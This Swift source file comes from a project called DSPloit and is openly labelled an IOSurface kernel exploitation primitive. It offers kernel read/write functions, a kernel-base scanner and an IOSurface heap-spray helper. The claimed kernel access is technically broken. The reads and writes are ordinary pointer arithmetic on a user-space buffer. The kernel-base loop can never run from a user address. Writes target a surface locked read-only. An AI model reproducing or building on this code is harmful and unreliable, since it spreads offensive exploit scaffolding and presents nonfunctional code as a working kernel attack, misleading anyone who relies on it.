//
//  IOSurfacePrimitive.swift
//  DSPloit
//
//  🔥 IOSurface Exploitation Primitive
//  Out-of-bounds read/write via IOSurface for kernel R/W
//  Created by Royan
//

import Foundation
import IOSurface

// MARK: - IOSurface Primitive

class IOSurfacePrimitive {
    static let shared = IOSurfacePrimitive()
    
    private var surface: IOSurface?
    private var surfaceID: IOSurfaceID = 0
    private var baseAddress: UInt64 = 0
    private var isSetup = false
    
    // MARK: - Setup
    
    func setup() -> Bool {
        guard !isSetup else { return true }
        
        // Create IOSurface with specific properties for exploitation
        let properties: [String: Any] = [
            kIOSurfaceWidth: 1024,
            kIOSurfaceHeight: 1024,
            kIOSurfaceBytesPerElement: 4,
            kIOSurfaceBytesPerRow: 4096,
            kIOSurfaceAllocSize: 4096 * 1024,
            kIOSurfacePixelFormat: kCVPixelFormatType_32BGRA
        ]
        
        guard let surf = IOSurfaceCreate(properties as CFDictionary) else {
            return false
        }
        
        self.surface = surf
        self.surfaceID = IOSurfaceGetID(surf)
        
        // Lock surface for CPU access
        IOSurfaceLock(surf, .readOnly, nil)
        
        // Get base address
        if let basePtr = IOSurfaceGetBaseAddress(surf) {
            self.baseAddress = UInt64(UInt(bitPattern: basePtr))
        }
        
        isSetup = true
        return true
    }
    
    // MARK: - Kernel Read/Write via IOSurface
    
    func kernelRead64(_ address: UInt64) -> UInt64 {
        guard isSetup, let surf = surface else { return 0 }
        
        // Calculate offset from base
        let offset = Int(address - baseAddress)
        
        // Use IOSurface OOB read
        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return 0 }
        let ptr = basePtr.advanced(by: offset)
        
        return ptr.load(as: UInt64.self)
    }
    
    func kernelWrite64(_ address: UInt64, value: UInt64) -> Bool {
        guard isSetup, let surf = surface else { return false }
        
        // Calculate offset from base
        let offset = Int(address - baseAddress)
        
        // Use IOSurface OOB write
        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return false }
        let ptr = basePtr.advanced(by: offset)
        
        ptr.storeBytes(of: value, as: UInt64.self)
        
        return true
    }
    
    func kernelRead(_ address: UInt64, size: Int) -> Data? {
        guard isSetup, let surf = surface else { return nil }
        
        let offset = Int(address - baseAddress)
        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return nil }
        
        let ptr = basePtr.advanced(by: offset)
        return Data(bytes: ptr, count: size)
    }
    
    func kernelWrite(_ address: UInt64, data: Data) -> Bool {
        guard isSetup, let surf = surface else { return false }
        
        let offset = Int(address - baseAddress)
        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return false }
        
        let ptr = basePtr.advanced(by: offset)
        data.withUnsafeBytes { bytes in
            ptr.copyMemory(from: bytes.baseAddress!, byteCount: data.count)
        }
        
        return true
    }
    
    // MARK: - Advanced Operations
    
    func findKernelBase() -> UInt64? {
        guard isSetup else { return nil }
        
        // Scan backwards from a known kernel address to find Mach-O header
        var addr = baseAddress
        
        while addr > 0xFFFFFFF000000000 {
            let magic = kernelRead32(addr)
            
            // Check for Mach-O magic (0xFEEDFACF for 64-bit)
            if magic == 0xFEEDFACF {
                // Verify it's actually kernel by checking some headers
                let cpuType = kernelRead32(addr + 4)
                if cpuType == 0x0100000C { // CPU_TYPE_ARM64
                    return addr
                }
            }
            
            addr -= 0x4000 // Page size
        }
        
        return nil
    }
    
    func kernelRead32(_ address: UInt64) -> UInt32 {
        let value = kernelRead64(address)
        return UInt32(value & 0xFFFFFFFF)
    }
    
    func kernelWrite32(_ address: UInt64, value: UInt32) -> Bool {
        let current = kernelRead64(address)
        let newValue = (current & 0xFFFFFFFF00000000) | UInt64(value)
        return kernelWrite64(address, value: newValue)
    }
    
    // MARK: - Cleanup
    
    func cleanup() {
        if let surf = surface {
            IOSurfaceUnlock(surf, .readOnly, nil)
        }
        surface = nil
        isSetup = false
    }
    
    deinit {
        cleanup()
    }
}

// MARK: - IOSurface Spray Helper

class IOSurfaceSpray {
    private var surfaces: [IOSurface] = []
    
    func spray(count: Int, size: Int) -> Bool {
        surfaces.removeAll()
        
        for _ in 0..<count {
            let properties: [String: Any] = [
                kIOSurfaceWidth: 1024,
                kIOSurfaceHeight: size / 4096,
                kIOSurfaceBytesPerElement: 4,
                kIOSurfaceBytesPerRow: 4096,
                kIOSurfaceAllocSize: size,
                kIOSurfacePixelFormat: kCVPixelFormatType_32BGRA
            ]
            
            guard let surf = IOSurfaceCreate(properties as CFDictionary) else {
                return false
            }
            
            surfaces.append(surf)
        }
        
        return true
    }
    
    func fillWithPattern(_ pattern: UInt64) {
        for surf in surfaces {
            IOSurfaceLock(surf, [], nil)
            
            if let basePtr = IOSurfaceGetBaseAddress(surf) {
                let size = IOSurfaceGetAllocSize(surf)
                let count = size / 8
                
                for i in 0..<count {
                    basePtr.advanced(by: i * 8).storeBytes(of: pattern, as: UInt64.self)
                }
            }
            
            IOSurfaceUnlock(surf, [], nil)
        }
    }
    
    func cleanup() {
        surfaces.removeAll()
    }
}

// MARK: - Convenience Extensions

extension dspmgr {
    func setupIOSurfacePrimitive() -> Bool {
        return IOSurfacePrimitive.shared.setup()
    }
    
    func iosurfaceRead64(_ address: UInt64) -> UInt64 {
        return IOSurfacePrimitive.shared.kernelRead64(address)
    }
    
    func iosurfaceWrite64(_ address: UInt64, value: UInt64) -> Bool {
        return IOSurfacePrimitive.shared.kernelWrite64(address, value: value)
    }
}
